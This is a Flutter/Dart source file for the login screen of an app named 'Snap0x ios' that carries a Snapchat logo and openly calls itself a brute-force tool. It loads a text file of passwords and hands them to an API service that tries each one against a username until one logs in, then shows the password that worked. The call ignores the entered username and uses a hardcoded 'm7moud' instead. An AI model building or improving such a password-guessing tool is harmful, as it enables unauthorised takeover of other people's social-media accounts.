import 'dart:async';
import 'dart:io';

import 'package:file_picker/file_picker.dart';
import 'package:flutter/material.dart';
import 'package:fluttertoast/fluttertoast.dart';
import 'package:progress_dialog_null_safe/progress_dialog_null_safe.dart';
import 'package:some_name/screens/list_password.dart';
import 'package:some_name/services/api_service.dart';

late ProgressDialog pr;
bool force = false;
StreamSubscription<Future<Map<String, dynamic>>?>? subscription;

class Login extends StatefulWidget {
  const Login({super.key});

  @override
  State<Login> createState() => _LoginState();
}

class _LoginState extends State<Login> {
  int counter = 0;
  String nameFile = 'select file ..';
  bool ifSelect = false;
  int currentIndex = 0;
  List<String> listPassword = [];
  TextEditingController username = TextEditingController();
  @override
  Widget build(BuildContext context) {
    pr = ProgressDialog(
      context,
      type: ProgressDialogType.download,
      textDirection: TextDirection.ltr,
      isDismissible: false,
    );
    pr.style(
      message: 'config Server ...',
      borderRadius: 10.0,
      backgroundColor: Colors.white,
      elevation: 10.0,
      insetAnimCurve: Curves.easeInOut,
      progress: 0.0,
      progressWidgetAlignment: Alignment.center,
      maxProgress: listPassword.length.toDouble(),
      progressTextStyle: const TextStyle(
          color: Colors.black, fontSize: 13.0, fontWeight: FontWeight.w400),
      messageTextStyle: const TextStyle(
          color: Colors.black, fontSize: 19.0, fontWeight: FontWeight.w600),
    );
    return Scaffold(
      bottomNavigationBar: BottomNavigationBar(
        currentIndex: currentIndex,
        onTap: (value) {
          setState(() {
            currentIndex = value;
          });
        },
        backgroundColor: Colors.yellow,
        items: const <BottomNavigationBarItem>[
          BottomNavigationBarItem(
            icon: Icon(Icons.snapchat),
            label: 'Login',
          ),
          BottomNavigationBarItem(
            icon: Icon(Icons.help),
            label: 'Help',
          ),
        ],
      ),
      body: currentIndex == 0
          ? Center(
              child: SingleChildScrollView(
                child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    crossAxisAlignment: CrossAxisAlignment.stretch,
                    children: [
                      Padding(
                        padding: const EdgeInsets.symmetric(horizontal: 24),
                        child: Column(
                          children: [
                            SizedBox(
                              height: 150,
                              child: Image.asset("images/snapcht_logo.png"),
                            ),
                            const Text(
                              "Snap0x ios",
                              style: TextStyle(
                                  fontSize: 40,
                                  fontWeight: FontWeight.w400,
                                  color: Colors.black),
                            ),
                          ],
                        ),
                      ),
                      const SizedBox(height: 30),
                      Padding(
                        padding: const EdgeInsets.symmetric(horizontal: 24),
                        child: Material(
                          elevation: 5,
                          color: Colors.yellow,
                          borderRadius: BorderRadius.circular(10),
                          child: TextField(
                            controller: username,
                            decoration: const InputDecoration(
                              border: OutlineInputBorder(),
                              hintText: 'Enter Username',
                            ),
                          ),
                        ),
                      ),
                      const SizedBox(height: 30),
                      Padding(
                        padding: const EdgeInsets.symmetric(horizontal: 24),
                        child: Material(
                            elevation: 5,
                            color: Colors.yellow,
                            borderRadius: BorderRadius.circular(10),
                            child: Container(
                                padding: const EdgeInsets.only(
                                    top: 5, left: 10, bottom: 5),
                                decoration: BoxDecoration(
                                  border: Border.all(
                                    color: Colors.black,
                                    width: 0.7,
                                  ),
                                  borderRadius: BorderRadius.circular(10),
                                ),
                                child: Row(
                                  children: [
                                    Expanded(
                                        child: Text(
                                      nameFile,
                                      style: TextStyle(
                                          fontSize: 18,
                                          color: ifSelect
                                              ? Colors.black
                                              : Colors.black54),
                                    )),
                                    IconButton(
                                        onPressed: () async {
                                          FilePickerResult? result =
                                              await FilePicker.platform
                                                  .pickFiles(
                                            type: FileType.custom,
                                            allowedExtensions: ['txt'],
                                          );
                                          if (result != null &&
                                              result.files.isNotEmpty) {
                                            PlatformFile file =
                                                result.files.first;
                                            File selectedFile =
                                                File(file.path!);

                                            if (await selectedFile.exists()) {
                                              List<String> lines =
                                                  await selectedFile
                                                      .readAsLines();
                                              setState(() {
                                                ifSelect = true;
                                                nameFile = file.name;
                                                listPassword = lines;
                                              });
                                            } else {
                                              Fluttertoast.showToast(
                                                  msg: 'File does not exist.');
                                            }
                                          } else {
                                            Fluttertoast.showToast(
                                                msg: 'No file selected.');
                                          }
                                        },
                                        icon: const Icon(
                                          Icons.upload_file_outlined,
                                          color: Colors.white,
                                        ))
                                  ],
                                ))),
                      ),
                      const SizedBox(height: 30),
                      Padding(
                        padding: const EdgeInsets.symmetric(horizontal: 100),
                        child: Material(
                          elevation: 5,
                          color: Colors.black,
                          borderRadius: BorderRadius.circular(10),
                          child: MaterialButton(
                            onPressed: () async {
                              if (username.text.isEmpty) {
                                Fluttertoast.showToast(msg: 'enter user name');
                                return;
                              }
                              if (!ifSelect) {
                                Fluttertoast.showToast(
                                    msg: 'you should select file passwords');
                                return;
                              }
                              if (listPassword.isEmpty) {
                                Fluttertoast.showToast(msg: 'file is empty');
                                return;
                              }

                              pr.show();

                              final server = await ApiService.getServer(7);
                              const user = "m7moud";

                              Stream<Future<Map<String, dynamic>>?>
                                  loginStream = ApiService.performLogin(
                                      user, listPassword, server!);
                              subscription = loginStream.listen((futureMap) {
                                if (futureMap != null) {
                                  futureMap.then((map) {
                                    if (map['logged:']) {
                                      force = true;
                                      pr.hide();
                                      subscription!.cancel();
                                      Navigator.push(
                                        context,
                                        MaterialPageRoute(
                                          builder: (context) =>
                                              ListPasswordPage(
                                                  password:
                                                      listPassword[counter],
                                                  passwords: listPassword),
                                        ),
                                      );
                                    }
                                    counter++;
                                  });
                                } else {
                                  pr.hide();
                                  subscription!.cancel();
                                  Fluttertoast.showToast(
                                      msg: "check your network ");
                                }
                              }, onDone: () {
                                pr.hide();

                                if (!force) {
                                  Fluttertoast.showToast(
                                      msg: "All passwords are wrong");
                                } else {
                                  force = false;
                                }
                              }, onError: (error) {
                                pr.hide();
                                Fluttertoast.showToast(
                                    msg: "check your network ");
                              });
                            },
                            minWidth: 200,
                            height: 42,
                            child: const Text(
                              'Run',
                              style: TextStyle(color: Colors.white),
                            ),
                          ),
                        ),
                      ),
                      const SizedBox(height: 20),
                      const Text(
                        "  Brute force is exclusive to iOS phones, all you have to do is \n  enter your username and password",
                        style: TextStyle(
                          fontSize: 13,
                          color: Colors.black,
                        ),
                      ),
                    ]),
              ),
            )
          : Container(
              child: const Center(child: Text("text help")),
            ),
    );
  }
}
